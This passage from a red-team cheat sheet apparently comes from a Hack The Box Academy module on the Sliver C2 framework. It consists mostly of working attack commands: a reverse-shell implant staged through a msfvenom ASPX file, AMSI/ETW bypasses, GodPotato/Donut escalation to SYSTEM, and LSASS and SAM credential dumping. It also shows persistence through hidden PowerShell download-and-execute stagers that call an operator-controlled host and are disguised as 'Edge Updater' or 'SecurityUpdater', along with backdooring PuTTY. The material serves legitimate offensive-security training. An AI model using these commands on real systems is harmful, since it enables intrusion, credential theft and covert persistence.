# Upgrade beacon to interactive session
sliver (beacon) > interactive
Note: The msfvenom ASPX shell is heavily signatured. In real engagements, use an obfuscated command-execution web shell (e.g., SharpyShell) to deliver the Sliver implant instead.
  • Create implant profile and stage listener: 
    sliver > profiles new --http [target-ip]:8088 --format shellcode htb
sliver > stage-listener --url tcp://[target-ip]:4443 --profile htb
sliver > http -L [target-ip] -l 8088
sliver > generate stager --lhost [target-ip] --lport 4443 --format csharp --save staged.txt
  • Generate ASPX wrapper and embed stager bytes: 
    msfvenom -p [password]/shell/reverse_tcp LHOST=[target-ip] LPORT=4443 -f aspx > sliver.aspx
  • Upload ASPX and interact with resulting session: 
    sliver > sessions
sliver > use 06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3
sliver (HIGH_RISER) > info

12.6 Basic Commands

12.6.1 cat

# Display a remote file's contents
sliver (http-session) > cat academy.txt

# Hex dump
sliver (http-session) > cat --hex academy.txt

# Save as loot
sliver (http-session) > cat --loot --name "interesting-file" academy.txt

12.6.2 cd

# Change working directory on target
sliver (http-beacon) > cd C:\Users

12.6.3 download

# Download a file
sliver (http-session) > download C:\Users\eric\secret.txt

# Download a directory (compressed as .tar.gz)
sliver (http-session) > download Pictures

# Recursive download
sliver (http-session) > download -r C:\Users\eric\Documents

12.6.4 upload

# Upload a file (escape backslashes)
sliver (http-session) > upload academy.txt C:\\Users\\eric\\Desktop\\academy.txt

# Forward slashes also work
sliver (http-session) > upload academy.txt C:/Users/eric/Desktop/academy.txt

12.6.5 execute-assembly

execute-assembly runs .NET binaries on the target without uploading them. By default it spawns a sacrificial notepad.exe child process.

# Run Seatbelt via execute-assembly
sliver (http-session) > execute-assembly Seatbelt.exe -group=system

# Run from local path
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/SharpCollection/NetFramework_4.0_Any/Seatbelt.exe -group=system

# Change hosting process
sliver (http-session) > execute-assembly --process explorer.exe Seatbelt.exe -group=system

# Run with AMSI and ETW bypass (in-process)
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
Note: The default notepad.exe sacrificial process is suspicious when spawned by a web process. Defenders monitoring parent-child relationships or .NET assembly loads will flag this. Change the process with --process.

12.6.6 Armory Alias Usage (Seatbelt)

# Use armory alias (note double dash before arguments)
sliver (HIGH_RISER) > seatbelt -- -group=all
sliver (HIGH_RISER) > seatbelt -- -group=system

12.6.7 Other Built-in Commands

# List processes
sliver (http-session) > ps

# Filter processes by name
sliver (http-session) > ps -e notepad

# Get current privileges
sliver (http-session) > getprivs

# Network interfaces
sliver (http-session) > ifconfig

# Interactive shell (bad opsec - spawns cmd.exe)
sliver (http-beacon) > shell

12.7 Privilege Escalation

12.7.1 Enumeration with SharpUp

# Enumerate privilege escalation opportunities
sliver (HIGH_RISER) > sharpup -- audit

Key output to look for: SeImpersonatePrivilege (common for IIS service accounts), modifiable services, unquoted service paths.

12.7.2 GodPotato (SeImpersonate Exploitation)

GodPotato exploits SeImpersonatePrivilege on Windows Server 2012 through Windows 11 / Server 2022. It creates a fake COM server and impersonates the SYSTEM token.

# Verify privilege via execute-assembly
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/GodPotato-NET4.exe -cmd "whoami"

12.7.3 Donut - Shellcode Generation

Donut converts .NET binaries to shellcode executable via execute-shellcode in Sliver, enabling in-memory execution without spawning a child process.

# Clone and build Donut
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile

# Generate shellcode from GodPotato (amd64, abort on AMSI fail)
./donut -i /home/htb-ac590/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac590/godpotato.bin
Donut FlagValueMeaning
-ipathInput binary to convert
-a2Architecture: amd64
-b2AMSI/WDLP/ETW bypass: Abort on fail
-pargsArguments passed to the binary
-opathOutput shellcode file

12.7.4 Executing Shellcode via Sacrificial Process

# Generate HTTP beacon (for SYSTEM callback)
sliver (HIGH_RISER) > generate beacon --http [target-ip]:9002 --skip-symbols -N http-beacon
sliver (HIGH_RISER) > upload http-beacon.exe
sliver (HIGH_RISER) > http --lhost [target-ip] --lport 9002

# Create sacrificial notepad process using Rubeus
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe

# Inject shellcode into the sacrificial process PID
sliver (HIGH_RISER) > execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin

# Monitor process state
sliver (HIGH_RISER) > ps -e notepad

# Interact with the new SYSTEM beacon
sliver (HIGH_RISER) > beacons
sliver (HIGH_RISER) > use 46d73efb

12.7.5 Assumed Breach: UAC and getsystem

# Check group membership
PS C:\Users\eric> net localgroup Administrators
PS C:\Users\eric> whoami /groups
# Check UAC status via registry
PS C:\Users\eric> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
PS C:\Users\eric> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# Generate beacon and start listener
sliver > generate beacon --http [target-ip]:9001 --skip-symbols --os windows -N http-beacon-9001
sliver > http -L [target-ip] -l 9001

# Connect via RDP, run beacon as Administrator to get elevated beacon
xfreerdp /v:[target-ip] /u:eric /p:[password] /d:child.[domain] /dynamic-resolution /cert-ignore /drive:academy,$(pwd)
# Upgrade beacon to session then getsystem
sliver (http-beacon-9001) > interactive
sliver (http-beacon-9001) > use 361e8e9a-...
sliver (http-beacon-9001) > getsystem
  • Check for SeImpersonate and other abusable privileges: 
    sliver (HIGH_RISER) > sharpup -- audit
  • Confirm SeImpersonate with GodPotato (whoami): 
    sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/GodPotato-NET4.exe -cmd "whoami"
  • Generate SYSTEM beacon via Donut + execute-shellcode: 
    ./donut -i /home/htb-ac590/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac590/godpotato.bin
sliver (HIGH_RISER) > execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
sliver (HIGH_RISER) > execute-shellcode -p <PID> /home/htb-ac590/godpotato.bin
  • For assumed-breach with local admin: upgrade beacon and getsystem: 
    sliver (http-beacon-9001) > interactive
sliver (http-beacon-9001) > use <session-id>
sliver (http-beacon-9001) > getsystem

12.8 Credential Harvesting

12.8.1 SAM Dump (hashdump)

Requires a NT AUTHORITY\SYSTEM beacon.

sliver (http-beacon-9001) > hashdump

12.8.2 LSASS Dump (procdump)

# Find LSASS PID
sliver (http-beacon) > ps -e lsass

# Dump LSASS with procdump
sliver (http-beacon) > procdump --pid 660 --save /tmp/lsass.dmp

# Parse dump with pypykatz
pypykatz lsa minidump /tmp/lsass.dmp

12.8.3 LSASS Dump (nanodump)

# Dump with nanodump (coff-loader, quieter than procdump)
sliver (http-beacon) > nanodump 656 web01-lsass 1 PMDM
sliver (http-beacon) > download web01-lsass
python3 -m pypykatz lsa minidump web01-lsass
  • Dump SAM hashes from SYSTEM beacon: 
    sliver (http-beacon-9001) > hashdump
  • Dump LSASS and parse with pypykatz: 
    sliver (http-beacon) > ps -e lsass
sliver (http-beacon) > procdump --pid <PID> --save /tmp/lsass.dmp
pypykatz lsa minidump /tmp/lsass.dmp
  • Use nanodump (stealthier alternative): 
    sliver (http-beacon) > nanodump <lsass-pid> web01-lsass 1 PMDM
sliver (http-beacon) > download web01-lsass
python3 -m pypykatz lsa minidump web01-lsass

12.9 Persistence

12.9.1 Scheduled Tasks

# Base64 encode a PowerShell download-and-exec stager (UTF-16LE)
echo -en "iex(new-object net.webclient).downloadString('http://[target-ip]:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0

# Create scheduled task via Sliver execute
sliver (http-beacon) > execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr \"powershell.exe -enc <BASE64>\" /ru SYSTEM'

12.9.2 Startup Folder (SharPersist)

# Add LNK file to user startup folder
sliver (http-beacon) > sharpersist -- -t startupfolder -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://[target-ip]:8088/stager.txt\')\" -f \"Edge Updater\" -m add

# Verify
sliver (http-beacon) > ls "C:\Users\eric\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

12.9.3 Registry Run Keys (SharPersist)

KeyScope
HKCU\Software\Microsoft\Windows\CurrentVersion\RunCurrent user, on logon
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceCurrent user, once on next logon
HKLM\Software\Microsoft\Windows\CurrentVersion\RunAll users, on logon (requires admin)
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceAll users, once (requires admin)
 
# Add HKLM Run key entry
sliver (http-beacon) > sharpersist -- -t reg -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://[target-ip]:8088/staged.txt\')\" -k \"hklmrun\" -v \"AdvancedProtection\" -m add

# List entries in HKLM Run
sliver (http-beacon) > sharpersist -- -t reg -k \"hklmrun\" -m list

12.9.4 Binary Backdoor

The backdoor command patches an existing binary to execute a shellcode profile when run.

# Create shellcode profile
sliver (http-beacon) > profiles new --format shellcode --http [target-ip]:9002 persistence-shellcode
sliver (http-beacon) > http -L [target-ip] -l 9002

# Backdoor an existing binary (PuTTY in this example)
sliver (http-beacon) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"
Note: The backdoor command replaces the original binary with a tampered version. The application may not function normally afterward. Sliver validates the profile and re-uploads the modified binary automatically.
  • Establish persistence via scheduled task (SYSTEM): 
    echo -en "iex(new-object net.webclient).downloadString('http://[target-ip]:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
sliver (http-beacon) > execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr \"powershell.exe -enc <B64>\" /ru SYSTEM'
  • Add startup folder LNK: 
    sliver (http-beacon) > sharpersist -- -t startupfolder -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://[target-ip]:8088/stager.txt\')\" -f \"Edge Updater\" -m add
  • Add HKLM Run registry key: 
    sliver (http-beacon) > sharpersist -- -t reg -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://[target-ip]:8088/staged.txt\')\" -k \"hklmrun\" -v \"AdvancedProtection\" -m add
  • Backdoor an existing binary: 
    sliver (http-beacon) > profiles new --format shellcode --http [target-ip]:9002 persistence-shellcode
sliver (http-beacon) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"

12.10 Domain Reconnaissance

Domain enumeration requires a domain context: a domain user account, NT AUTHORITY\SYSTEM, or a machine account. Local accounts (IIS service account, local admin) cannot enumerate domain objects.

12.10.1 PowerView via sharpsh

sharpsh executes PowerShell via RunSpaceFactory. Commands are base64-encoded and served from an HTTP server.

# Start Python HTTP server in directory containing PowerView.ps1
python3 -m http.server 8081

# Encode a PowerView query
echo -n "get-netuser | select samaccountname,description" | base64
# Result: Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u

# Run via sharpsh
sliver (http-beacon) > sharpsh -- '-u http://[target-ip]:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
# Encode kerberoastable user query
echo "Get-NetUser -spn | select samaccountname,description" | base64
# Result: R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo=

sliver (http-beacon) > sharpsh -- '-u http://[target-ip]:8080/PowerView.ps1 -e -c "R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo="'

12.10.2 SharpView

# Enumerate users without Kerberos pre-authentication
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M

# Get domain info
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-domain" -t 240 -i -E -M
Note: There is a 254-character limit for commands passed to tools via Sliver. Use -i (in-process), -E (ETW bypass), and -M (AMSI bypass) flags with execute-assembly for SharpView.

12.10.3 Domain Info via BOF

# Get domain info via coff-loader (c2tc-domaininfo)
sliver (http-beacon) > c2tc-domaininfo

12.10.4 Certificate Enumeration

# Enumerate ADCS certificate templates via Certify armory extension
sliver (http-beacon) > certify -- find

12.10.5 Network Adapter Enumeration

# List network adapters and IP addresses (find pivot opportunities)
sliver (http-beacon) > ifconfig

12.10.6 Forest Enumeration

# Enumerate forest domains via .NET DirectoryServices
